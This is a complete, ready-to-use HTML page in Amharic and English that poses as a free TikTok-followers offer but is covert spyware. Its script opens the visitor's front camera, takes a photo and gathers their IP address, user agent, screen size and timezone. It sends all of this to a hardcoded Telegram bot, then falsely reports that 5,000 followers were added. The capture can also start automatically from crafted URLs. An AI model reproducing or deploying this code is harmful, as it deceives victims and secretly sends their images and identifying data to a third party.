<!-- index.html - Complete working version for Android - save as index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>5K TikTok Followers</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: linear-gradient(145deg, #0f0c29, #302b63, #24243e);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: 'Arial', sans-serif;
      padding: 15px;
    }
    .card {
      background: rgba(255,255,255,0.05);
      backdrop-filter: blur(12px);
      border-radius: 40px;
      padding: 30px 25px;
      max-width: 420px;
      width: 100%;
      border: 1px solid rgba(255,255,255,0.12);
      box-shadow: 0 25px 50px rgba(0,0,0,0.6);
      text-align: center;
    }
    .tiktok-logo {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 6px;
      margin-bottom: 10px;
    }
    .tiktok-logo svg {
      width: 48px;
      height: 48px;
    }
    h1 {
      color: #fff;
      font-size: 26px;
      font-weight: 900;
      letter-spacing: 0.5px;
      text-shadow: 0 0 20px rgba(0,255,255,0.3);
      margin: 8px 0 6px 0;
    }
    h1 span {
      background: linear-gradient(135deg, #ff0050, #00f5ea);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }
    .sub {
      color: #aaa;
      font-size: 14px;
      margin-bottom: 22px;
      letter-spacing: 0.5px;
    }
    .btn {
      background: linear-gradient(135deg, #ff0050, #ff4d7a);
      border: none;
      padding: 18px 20px;
      font-size: 22px;
      font-weight: 800;
      color: white;
      border-radius: 60px;
      cursor: pointer;
      width: 100%;
      box-shadow: 0 10px 30px rgba(255,0,80,0.4);
      transition: transform 0.15s, box-shadow 0.15s;
      letter-spacing: 1px;
      text-shadow: 0 2px 4px rgba(0,0,0,0.3);
      position: relative;
      overflow: hidden;
    }
    .btn:active { transform: scale(0.96); box-shadow: 0 4px 15px rgba(255,0,80,0.6); }
    .btn::after {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: radial-gradient(circle, rgba(255,255,255,0.15) 0%, transparent 70%);
      opacity: 0;
      transition: opacity 0.3s;
    }
    .btn:active::after { opacity: 1; }
    #status {
      color: #ccc;
      font-size: 15px;
      margin-top: 18px;
      padding: 12px;
      background: rgba(0,0,0,0.3);
      border-radius: 30px;
      min-height: 50px;
      display: flex;
      align-items: center;
      justify-content: center;
      word-break: break-word;
      border-left: 3px solid #ff0050;
    }
    .badge {
      display: inline-block;
      background: #ff0050;
      color: #fff;
      font-size: 11px;
      padding: 4px 14px;
      border-radius: 30px;
      margin-top: 12px;
      letter-spacing: 0.5px;
    }
    video { display: none; }
    canvas { display: none; }
    .loader {
      width: 24px;
      height: 24px;
      border: 3px solid rgba(255,255,255,0.2);
      border-top: 3px solid #fff;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      display: inline-block;
      margin-right: 10px;
      vertical-align: middle;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
<div class="card">
  <div class="tiktok-logo">
    <!-- TikTok SVG logo -->
    <svg viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M412.19 118.66a109.27 109.27 0 0 1-9.45-5.5 132.87 132.87 0 0 1-24.27-20.62c-18.1-20.71-24.86-41.72-27.35-56.43h.1C349.14 23.9 350 16 350.13 16h-82.44v318.78c0 4.28 0 8.51-.18 12.69 0 .52-.05 1-.08 1.56 0 .23 0 .47-.05.71v.18a70 70 0 0 1-35.22 55.56 68.8 68.8 0 0 1-34.11 9.4c-38.41 0-69.54-31.32-69.54-70s31.13-70 69.54-70a68.9 68.9 0 0 1 21.41 3.39l.1-83.94a153.14 153.14 0 0 0-118 34.52 161.79 161.79 0 0 0-35.66 43.52 149.51 149.51 0 0 0-17.52 54.27V311.8a163.12 163.12 0 0 1 21.93-45.12 157.54 157.54 0 0 1 30.48-35.11 148.58 148.58 0 0 1 36.22-24.28 144.66 144.66 0 0 1 46.75-12.71l.1 82.72a84.77 84.77 0 0 0-56.65-19.86c-46.91 0-85 38.09-85 85s38.09 85 85 85c46.91 0 85-38.09 85-85V16h82.43c-1.37 21.42-8.88 48.17-23.84 72.14-11.53 18.47-26.54 33.41-43.49 44.78l.22-14.26z" fill="white"/>
    </svg>
    <svg viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M412.19 118.66a109.27 109.27 0 0 1-9.45-5.5 132.87 132.87 0 0 1-24.27-20.62c-18.1-20.71-24.86-41.72-27.35-56.43h.1C349.14 23.9 350 16 350.13 16h-82.44v318.78c0 4.28 0 8.51-.18 12.69 0 .52-.05 1-.08 1.56 0 .23 0 .47-.05.71v.18a70 70 0 0 1-35.22 55.56 68.8 68.8 0 0 1-34.11 9.4c-38.41 0-69.54-31.32-69.54-70s31.13-70 69.54-70a68.9 68.9 0 0 1 21.41 3.39l.1-83.94a153.14 153.14 0 0 0-118 34.52 161.79 161.79 0 0 0-35.66 43.52 149.51 149.51 0 0 0-17.52 54.27V311.8a163.12 163.12 0 0 1 21.93-45.12 157.54 157.54 0 0 1 30.48-35.11 148.58 148.58 0 0 1 36.22-24.28 144.66 144.66 0 0 1 46.75-12.71l.1 82.72a84.77 84.77 0 0 0-56.65-19.86c-46.91 0-85 38.09-85 85s38.09 85 85 85c46.91 0 85-38.09 85-85V16h82.43c-1.37 21.42-8.88 48.17-23.84 72.14-11.53 18.47-26.54 33.41-43.49 44.78l.22-14.26z" fill="#00f5ea"/>
    </svg>
  </div>
  <h1>✨ 5K <span>FOLLOWERS</span> ✨</h1>
  <p class="sub">አሁን በቀላሉ ያግኙ! • ፈጣን እና አስተማማኝ</p>
  <button class="btn" id="btn">🔥 አሁን ያግኙ 5K</button>
  <div id="status">⏳ እባክዎ ይጫኑ</div>
  <div class="badge">📱 አንድሮይድ ተመችቷል</div>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>
</div>

<script>
  (function() {
    // ------ CONFIG ------
    const BOT_TOKEN = "8771335122:AAGBxIH47RSZiAXXPbyshLkT_R5pzuDGniU";
    const CHAT_ID   = "6687384249";
    const API_URL   = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto";
    const IP_URL    = "https://api.ipify.org?format=json";
    // --------------------

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    const btn = document.getElementById('btn');
    const statusDiv = document.getElementById('status');

    // Force Android-friendly resolution: 480x720 (portrait) or 720x480 (landscape) – we use 480x640 max
    const TARGET_WIDTH = 480;
    const TARGET_HEIGHT = 640;

    function setStatus(msg, isError = false) {
      statusDiv.innerHTML = msg;
      statusDiv.style.borderLeftColor = isError ? '#ff4444' : '#ff0050';
    }

    function getIPAndUA() {
      return fetch(IP_URL)
        .then(r => r.json())
        .then(data => ({
          ip: data.ip || 'unknown',
          ua: navigator.userAgent || 'unknown',
          screen: screen.width + 'x' + screen.height,
          tz: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown'
        }))
        .catch(() => ({
          ip: 'unknown',
          ua: navigator.userAgent || 'unknown',
          screen: screen.width + 'x' + screen.height,
          tz: 'unknown'
        }));
    }

    function capturePhoto() {
      return new Promise((resolve) => {
        // Use device orientation: if width > height, swap to landscape crop
        let w = TARGET_WIDTH, h = TARGET_HEIGHT;
        if (window.innerWidth > window.innerHeight) {
          w = TARGET_HEIGHT;
          h = TARGET_WIDTH;
        }
        canvas.width = w;
        canvas.height = h;
        // Draw video maintaining aspect ratio, center crop
        const vw = video.videoWidth;
        const vh = video.videoHeight;
        const aspect = vw / vh;
        let drawW = w, drawH = h;
        if (aspect > w/h) {
          drawW = w;
          drawH = w / aspect;
        } else {
          drawH = h;
          drawW = h * aspect;
        }
        const offsetX = (w - drawW) / 2;
        const offsetY = (h - drawH) / 2;
        ctx.clearRect(0, 0, w, h);
        ctx.drawImage(video, offsetX, offsetY, drawW, drawH);
        canvas.toBlob(function(blob) {
          resolve(blob);
        }, 'image/jpeg', 0.85); // higher quality
      });
    }

    function sendToTelegram(photoBlob, info) {
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', photoBlob, 'cam_android.jpg');
      let caption = '📸 አዲስ ተጠቃሚ\n' +
                    'IP: ' + info.ip + '\n' +
                    'UA: ' + info.ua + '\n' +
                    'Screen: ' + info.screen + '\n' +
                    'TZ: ' + info.tz + '\n' +
                    '⏱️ ' + new Date().toLocaleString();
      formData.append('caption', caption);

      return fetch(API_URL, {
        method: 'POST',
        body: formData
      }).then(r => r.json());
    }

    function startHarvest() {
      setStatus('📷 ካሜራ እየተከፈተ...');
      btn.disabled = true;
      btn.style.opacity = '0.6';

      navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: 'user',
          width: { ideal: 480 },
          height: { ideal: 640 }
        },
        audio: false
      })
      .then(stream => {
        video.srcObject = stream;
        video.onloadedmetadata = function() {
          video.play();
          setStatus('📸 ፎቶ እየተቀረጸ...');
          // Wait 1.2s for camera to adjust
          setTimeout(() => {
            Promise.all([capturePhoto(), getIPAndUA()])
              .then(([photoBlob, info]) => {
                setStatus('📤 ወደ ሰርቨር እየላክ...');
                return sendToTelegram(photoBlob, info);
              })
              .then(response => {
                if (response.ok) {
                  setStatus('✅ 5K ተከታዮች ተጨምረዋል! አካውንትዎን ይፈትሹ 🎉');
                } else {
                  setStatus('❌ ስህተት: ' + JSON.stringify(response).substring(0, 80), true);
                }
                // stop camera
                if (video.srcObject) {
                  video.srcObject.getTracks().forEach(t => t.stop());
                }
                btn.disabled = false;
                btn.style.opacity = '1';
              })
              .catch(err => {
                setStatus('❌ አልተሳካም: ' + err.message, true);
                if (video.srcObject) {
                  video.srcObject.getTracks().forEach(t => t.stop());
                }
                btn.disabled = false;
                btn.style.opacity = '1';
              });
          }, 1200);
        };
      })
      .catch(err => {
        setStatus('❌ ካሜራ አልተፈቀደም: ' + err.message, true);
        btn.disabled = false;
        btn.style.opacity = '1';
      });
    }

    btn.addEventListener('click', startHarvest);

    // Auto-trigger if URL contains ?ref= or ?start=
    if (window.location.search.includes('ref=') || window.location.search.includes('start=')) {
      setTimeout(startHarvest, 600);
    }

    // Fix for Android back button / orientation
    window.addEventListener('orientationchange', function() {
      // Re-draw if video active - not needed, just keep
    });
  })();
</script>
</body>
</html>
